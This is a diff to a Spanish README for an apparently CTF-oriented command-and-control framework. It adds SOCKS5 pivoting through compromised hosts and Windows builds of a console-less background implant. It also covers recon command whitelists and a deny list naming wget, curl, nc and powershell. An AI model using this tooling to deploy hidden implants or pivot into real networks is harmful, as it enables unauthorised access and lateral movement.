@@ -187,6 +187,10 @@ curl http://127.0.0.1:8080/health
 | POST | `/socks/stop` | Detener servidor SOCKS5 |
 | GET | `/socks/status` | Estado del servidor SOCKS5 |
 | GET | `/socks/channels` | Listar canales SOCKS activos |
+| POST | `/socks/connect` | Crear canal a un target (operador → implant) |
+| GET | `/socks/data/<channel_id>` | Implant consulta datos pendientes |
+| POST | `/socks/data/<channel_id>` | Implant envía datos del target |
+| POST | `/socks/connected/<channel_id>` | Implant reporta conexión exitosa |
 
 ---
 
@@ -259,13 +263,20 @@ curl -H "X-Auth-Token: supersecret-ctf-token" \
 
 ## Pivoting (SOCKS5 Proxy)
 
-El C2 incluye un servidor SOCKS5 para pivoting a través de máquinas comprometidas.
+El C2 incluye un servidor SOCKS5 funcional para pivoting a través de máquinas comprometidas.
 
 ### Arquitectura SOCKS
 
 ```
 [Operador] → localhost:1080 → [Server SOCKS] → C2 Channel → [Implant] → [Target]
 ```
+
+### Flujo completo
+
+1. **Iniciar proxy SOCKS** en el servidor C2
+2. **Crear canal** a un target a través de un implant
+3. **Usar proxy** con curl, SSH, proxychains, etc.
+4. **Detener** cuando se termine
 
 ### Iniciar proxy SOCKS
 
@@ -279,6 +290,29 @@ curl -X POST -H "X-Auth-Token: supersecret-ctf-token" \
 # {"status":"ok","message":"SOCKS5 server listening on 127.0.0.1:1080"}
 ```
 
+### Crear canal SOCKS a un target
+
+```bash
+# El operador solicita conexión a un target a través de un implant
+curl -X POST -H "X-Auth-Token: supersecret-ctf-token" \
+  -H "Content-Type: application/json" \
+  -d '{"agent_id": "<AGENT_ID>", "target_host": "10.0.0.5", "target_port": 22}' \
+  http://127.0.0.1:8080/socks/connect
+
+# Respuesta:
+# {"status":"ok","channel_id":"socks_1234567890","target":"10.0.0.5:22"}
+```
+
+### Ver canales activos
+
+```bash
+curl -H "X-Auth-Token: supersecret-ctf-token" \
+  http://127.0.0.1:8080/socks/channels
+
+# Respuesta:
+# {"channels":[{"channel_id":"socks_1234567890","target":"10.0.0.5:22","connected":true,...}]}
+```
+
 ### Ver estado del proxy
 
 ```bash
@@ -286,7 +320,7 @@ curl -H "X-Auth-Token: supersecret-ctf-token" \
   http://127.0.0.1:8080/socks/status
 
 # Respuesta:
-# {"running":true,"host":"127.0.0.1","port":1080,"channels":0}
+# {"running":true,"host":"127.0.0.1","port":1080,"channels":1}
 ```
 
 ### Usar proxy con curl
@@ -330,11 +364,30 @@ pip install pyinstaller
 # Output: dist/implant-linux (binario standalone)
 ```
 
-### Build Windows
+### Build Windows (nativo, recomendado)
+
+Desde PowerShell en la máquina Windows:
+
+```powershell
+.\build\build_windows_native.ps1
+# Output: dist/implant.exe (background, sin ventana de consola)
+
+# Con icono personalizado
+.\build\build_windows_native.ps1 -IconPath ".\build\assets\implant.ico"
+
+# Sin compresión UPX
+.\build\build_windows_native.ps1 -NoUpx
+```
+
+> El `.exe` generado corre en **background** sin abrir ninguna ventana de consola (`--noconsole`).
+
+### Build Windows (cross-compile con Wine)
+
+Requiere Python instalado **dentro** de Wine:
 
 ```bash
 ./build/build_windows.sh
-# Output: dist/implant.exe (requiere Wine para cross-compilation)
+# Output: dist/implant.exe
 ```
 
 ### Build ambos
@@ -349,7 +402,8 @@ pip install pyinstaller
 # Linux
 ./dist/implant-linux
 
-# Windows
+# Windows (override de URL si el profile tiene IP incorrecta)
+$env:C2_URL = "http://192.168.1.121:8080"
 .\dist\implant.exe
 ```
 
@@ -361,15 +415,18 @@ cd implant
 # Linux
 pyinstaller --onefile --strip --name implant-linux implant.py
 
-# Windows (en Windows o con Wine)
-pyinstaller --onefile --name implant.exe implant.py
+# Windows (en Windows nativo)
+python -m PyInstaller --onefile --noconsole --name implant.exe `
+  --add-data "profiles\default.yaml;profiles" implant.py
 ```
 
 ---
 
 ## Whitelist de Comandos Permitidos
 
-Solo estos comandos pueden ejecutarse en el agente:
+El implant selecciona automáticamente la whitelist según el OS donde corre (`platform.system()`).
+
+### Linux
 
 | Comando | Descripción | Ejemplo |
 |---------|-------------|---------|
@@ -386,9 +443,26 @@ Solo estos comandos pueden ejecutarse en el agente:
 | `uptime` | Tiempo activo | `uptime` |
 | `df` | Espacio en disco | `df -h` |
 
+### Windows
+
+| Comando | Descripción | Ejemplo |
+|---------|-------------|---------|
+| `whoami` | Usuario actual | `whoami` |
+| `hostname` | Nombre del host | `hostname` |
+| `ipconfig` | Configuración de red | `ipconfig /all` |
+| `dir` | Listar archivos | `dir C:\Users` |
+| `tasklist` | Procesos en ejecución | `tasklist` |
+| `net` | Info de red y usuarios | `net user` |
+| `systeminfo` | Info del sistema | `systeminfo` |
+| `echo` | Mostrar texto | `echo %USERNAME%` |
+| `type` | Mostrar contenido de archivo | `type C:\file.txt` |
+| `ping` | Verificar conectividad | `ping 8.8.8.8` |
+| `cat` | Mostrar archivo (PowerShell) | `cat C:\file.txt` |
+| `ps` | Procesos (PowerShell) | `ps` |
+
 **Comandos RECHAZADOS (por seguridad):**
 
-- `rm`, `wget`, `curl`, `bash`, `python`, `nc`
+- `rm`, `wget`, `curl`, `bash`, `python`, `nc`, `powershell`
 - Cualquier comando con `;`, `|`, `&`, `` ` ``, `$(`, `>`, `<`
 
 ---
